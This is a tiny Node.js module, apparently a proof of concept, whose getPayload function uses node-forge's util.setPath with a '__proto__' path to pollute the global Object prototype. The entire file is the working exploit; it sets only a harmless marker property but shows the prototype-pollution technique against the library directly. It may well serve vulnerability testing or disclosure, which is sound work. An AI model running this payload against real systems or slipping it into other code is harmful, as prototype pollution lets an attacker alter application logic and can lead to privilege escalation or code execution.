function getPayload() {
    const obj = {};
    require("node-forge").util.setPath(obj, ["__proto__", "polluted"], "yes");
    return obj;
}

module.exports = { getPayload };